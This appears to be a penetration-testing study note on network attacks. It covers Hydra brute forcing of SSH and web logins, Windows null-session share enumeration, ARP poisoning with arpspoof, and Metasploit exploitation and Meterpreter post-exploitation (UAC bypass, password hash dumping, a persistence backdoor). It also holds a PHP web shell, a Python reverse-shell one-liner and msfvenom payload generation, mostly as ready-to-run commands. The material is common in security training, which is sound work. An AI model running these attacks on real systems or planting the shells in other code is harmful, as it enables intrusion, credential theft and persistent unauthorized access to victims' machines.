# Network Attacks

## Authentication Cracking

A similar approach to cracking a password can be used for every service requiring network authentication as: `ssh`, `telnet`, remote desktop, HTTP authentication, etc.

## Brute Force vs Dictionary Attacks

Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe:

* Network latency.
* Delays on the attacked service.
* Processing time on the attacked server.
* Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and default usernames and passwords

### **Hydra**

Fast, parallelized, network authentication cracker that supports different protocols: Cisco auth, `FTP`, `HTTP`, `IMAP`, `RDP`, `SMB`, `SSH`, `Telnet`...

```bash
# To get detailed information about a module:
hydra -U rdp

# To launch a dictionary attack against a service:
hydra -L users.txt -P pass.txt <service://server> <options>

# For instance
hydra -L users.txt -P pass.txt telnet://target.server

# Attack session against a password protected web resource
hydra -L users.txt -P pass.txt http-get://localhost/

# Brute-force login form
# => See Module Info
> hydra -U http-post-form
# Our cmd
> hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/sseclist/Passwords/rockyou-15.txt -f -V

# Brute-force SSH
hydra 10.10.10.3 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V

# -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
# -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
```

## Windows Shares

> Ability to:
>
> * Enumerate network resources.
> * Attack Windows sessions.
> * Obtain unauthorized access to Windows resources.

Windows' filesharing can be exploited via _NetBIOS_ (Network Basic Input Output System):

* Allows servers and clients to view network shares on a local area network.
* It can supply some of the following information while querying computers: Hostname, NetBIOS name, Domain, Network shares.
* NetBIOS sits between the application layer and the IP layer (NetBIOS over TCP/IP).
  * UDP is used to perform name resolution and to carry other one-to-many datagram-based communications (like send small messages to the rest of the other hosts).
  * TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_.
* MS Windows browses the network using NetBIOS to:
  * Datagrams to list the shares and the machines.
  * Names to find workgroups.
  * Sessions to transmit data to and from a Windows share.

### Shares

An authorized user can access shares by using **UNC Paths (Universal Naming Connection Paths**:

```bash
\\ServerName\ShareName\file.nat
\\ComputerName\C$ # access to a volume (C$, D$, E$)
\\ComputerName\admin$ # points to the windows installation directory
\\ComputerName\ipc$  # used for inter-process communication, cannot be browsed via Explorer
```

> Badly configured shares exploitation can lead to:
>
> * Information disclosure.
> * Unauthorized file access.
> * Information leakage used to mount a targeted attack.

## Null Sessions

Null session attacks can be used to enumerate a lot of information: Passwords, System users, System groups, Running system processes.

* Remotely exploitable.
* Nowadays Windows is configured to be immune to this kind of attack.
* Applicable to legacy systems.
* Exploits an authentication vulnerability for Windows Administrative Shares, lets an attacker connect to a local or remote share without authentication.
* Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions.

### Tools

* `nbstat`: windows cmd tool that can display info about the target.
* `nbstat -A <IP>`: displays info about a target.

```bash
Name                Type      Status
----------------------------------------
ELS-WINXP     <00>  UNIQUE    Registered
WORKGROUP     <00>  GROUP     Registered
ELS-WINXP     <20>  UNIQUE    Registered
```

* `ELS-WINXP`: name
* `<00>`: workstation
* `UNIQUE`: this computer must have only one IP address assigned
* `<20>`: file sharing service is up and running on the machine
* Once an attacker knows that a machine has a 'File Server' service running, they can enumerate the shares by using `net view`:

```bash
NET VIEW <target IP>
```

* Share enumeration from a Linux Machine is provided by the _Samba suite_.
* `nmblookup -A <target ip address>` gets the same results as `NET VIEW <target_IP>`.

`smbclient` also displays _shares that are hidden when using Windows standard tools_:

```bash
# To enumerate the shares provided by a host
smbclient -L //<target_IP> -N

# -L allows to look at what services are available on a target
# -N forces the tool to not ask for a password
```

Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it's time to check if a null session attack is possible. We can exploit `IPC$` administrative share by trying to connect to it without valid credentials.

**Checking for Null Sessions with Windows**

To connect:

```
# This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
NET USE \\<target IP address>\IPC$ '' /u:''

smbclient //<target_IP>/IPC$ -N
```

**Exploiting Null Sessions with Enum**

```bash
enum -S <target>  # -S lets you enumerate the shares of a machine
enum -U <target>  # -U enumerates the users
enum -P <target>  # -P check the password policy
```

* Checking password policies before running an authentication attack lets you fin-tune an attack tool to:
  * Prevent accounts locking
  * Prevent false positives
  * Choose your dictionary or your bruteforcer configuration (as knowing the min and max lengh of a password helps to save time)

**Exploiting Null Session with Winfo**

Automates null session exploitation.

Use with `-n` to tell the tool to use null sessions

```bash
winfo <target_IP> -n
```

**Exploiting Null sessions with Enum4linux**

A PERL script that can perform the same operations of `enum` and `winfo`, supplying some other features:

* User enumeration
* Share enumeration
* Group and member enumeration
* Password policy extraction
* OS info detection
* A nmblookup run
* Printer information extraction

```bash
# Look for null sessions in the network
nmap -sS -p135,139,445 <IP>

# => enum4linux
# -n
# -P Password policies of the system
# -S shares available in the remote machine
# brute force:
enum4linux -s /usr/share/enum4linux/share-list.txt <IP>
# -a do all simple enumeration

# => samrdump
# It's under : /usr/share/doc/python-impacket-doc/examples
python samrdump <IP>

# => nmap
nmap -script=smb-enum-shares <IP>
nmap -script=smb-brute <IP>
```

Use samba in Kali:

```bash
> vi /etc/samba/smb.conf

# Under [global]
client min protocol = CORE
client max protocol = SMB3
client use spnego = no
client ntlmv2 auth = no

# Get file shares using smbclient
smbclient -L WORKGROUP -I <IP> -N -U ""

# Access to a folder
smbclient \\\\<IP>\\WorkSharing -N
smb: \> ls
smb: \> get flag.txt /home/kali/Desktop/flag.txt
```

## ARP Poisoning

If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.

{% hint style="info" %}
**Goals**

* Perform MITM attacks.
* Mount advanced attacks.
* Sniff traffic on a switched network.
{% endhint %}

* The attacker can manipulate other hosts' ARP cache tables by sending gratuitous ARP replies.
* Gratuitous ARP replies = ARP reply messages.
* The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address.
* The operation is performed on every victim.
* As soon as the ARP cache table contains fake info, every packet of every communication between the poisoned nodes will be sent to the attacker's machine.
* The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
* This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet.

### Dsniff Arpspoof

Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN. `arpspoof` redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.

Before running the tool, you have to enable the _Linux Kernel IP Forwarding_, a feature that transforms a Linux box into a router. By enabling IP forwarding, you tell your machine to forward the packets you interecept to the real destination host:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# right after you can run arpspoof
arpspoof -i <interface> -t <target> -r <host>
# target and hosts are the victims IP addresses

# => Example
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
```

## Metasploit

Metasploit is an open-source framework used for penetration testing and exploit development, giving a wide array of community contributed exploits and attack vectors that can be used against various systems. Extensible.

Basic workflow:

* Identifying a vulnerable service.
* Searching for a proper exploit for that service.
* Loading and configuring the exploit.
* Loading and configuring the payload you want to use.
* Running the exploit code and getting access to the vulnerable machine.

A payload is used by an attacker to get:

* An OS Shell.
* A VNC or RDP connection.
* A Meterpreter shell.
* The execution of an attacker-supplied application.

A special payload, with many useful features under the penetration testing point of view is `meterpreter`.

{% tabs %}
{% tab title="Start MSF" %}
```bash
$ service postgresql start
$ msfconsole
> help
> show -h
> search <searchterm> # search for a specific module by using the search cmd
> search skeleton
> search turboftp
> show exploits # impractical to use
> use exploit/windows/ftp/turboftp_port # to use exploit for turboftp
> info
> show options
> back
> show payloads
> set payload windows/meterpreter/reverse_tcp
> exploit
```
{% endtab %}

{% tab title="Exploit freeftpd" %}
```bash
# Exploit freeftpd
> use exploit/windows/ftp/freeftpd_pass
> set ftpuser anonymous
> set rhosts 192.168.99.12
> set rport 21
> set payload windows/meterpreter/reverse_tcp
> set exitfunc process
> set lhost 192.168.99.100
> set lport 4444
> exploit
# Get user
> getuid
# Obtain System privileges on the machine
> getsystem
```
{% endtab %}

{% tab title="Set backdoor" %}
```bash
# Set backdoor
use exploit/windows/local/persistence
set reg_name backdoor
set exe_name backdoor
set startup SYSTEM
set session 1
set payload windows/meterpreter/reverse_tcp
set exitfunc process
set lhost 192.168.99.100
set lport 5555
set DisablePayloadHandler false
exploit 
# if the backdoor doesn't start immediately, use 
# "exploit -j" instead
```
{% endtab %}
{% endtabs %}

## Meterpreter

{% hint style="info" %}
**Goals**

* Get a powerful shell on an exploited machine
* Take control over an exploited machine
* Install backdoors
{% endhint %}

Provides advanced features to:

* Gather information.
* Transfer files between the attacker and victim machines.
* Install backdoors and more.
* `meterpreter` can both wait for a connection on the target machine or connect back to the attacker machine.
* A Meterpreter session is an advanced shell on the target machine.
* Most used configurations are:
  * _bind\_tcp_: runs a server process on the target machine that waits for connections from the attacker machine.
  * _reverse\_tcp_: performs a TCP connection back to the attacker machine (helping to evade firewall rules).

Inside a `msfconsole`:

```bash
> search meterpreter
> set payload windows/meterpreter/reverse_tcp
> exploit
> sessions -l # current opened sessions
> sessions -i 1 # resume session 1
> sysinfo # retrieve info about the exploited machine
> ifconfig # prints the network configuration
> route # routing info
> getuid # which user is running the process exploited
> getsystem # Runs a privilege escalation routine on the target machine

# Bypass UAC (User Account Control policy of modern Windows OSs)
> background # switch from a meterpreter session to the msf console
> search bypassuac
> use exploit/windows/local/bypassuac
> set session 1
> exploit
> getuid

# Dumping the Password Database
> background
> use post/windows/gather/hashdump
> set session 2
> exploit

# Upload / download files
> download HaxLogs.log /root/
> upload /root/backdoor.exe c:\\Windows # note the backslash escaping
> shell

# Is UAC enabled?
run post/windows/gather/win_privs
```

## Shells

```bash
system('ls');

echo 'ls';

passthru("ls");

# Python
import os
exit_code = os.system('ls')
output    = os.popen('ls').read()
```

Simple php shell:

```php
<html>
<?php
  echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></form>";
  system($_GET["cmd"]);
```

Reverse Shell is the most common one we'll use:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### msfvenom

```bash
# msfvenom
# => list payloads for linux
msfvenom --list payloads | grep x64 | grep linux | grep reverse

# => Generate Staged payload
msfvenom -p linux/x64/shell/reverse_tcp lhost=<attacker_IP> lport=443 -f elf -o r443
chmod +x r433

# => Generate Stagelesss payload
> msfvenom --list payloads | grep php | grep reverse
> msfvenom -p php/reverse_php lhost=<attacker_IP> lport=443 -o r443.php

# => Listener staged
$ msfconsole
> use exploit/multi/handler
> set payload linux/x64/shell/reverse_tcp # has to be exactly the same!
> set lhost 0.0.0.0
> set lport 443
> run # wait for session

# => Listener Stageless
> nc -lvp 4343
# or listen to in MSF with exact payload and the exploit/multi/handler


# Difference between:
#  linux/x64/shell/reverse_tcp
#  linux/x64/shell_reverse_tcp
#
# Staged: it's smaller. Not enough to create a shell itself. You require to use a msf listener.
# Stageless: it's bigger. It doesn't need anything aditional, just nc in your computer as a listener.
```
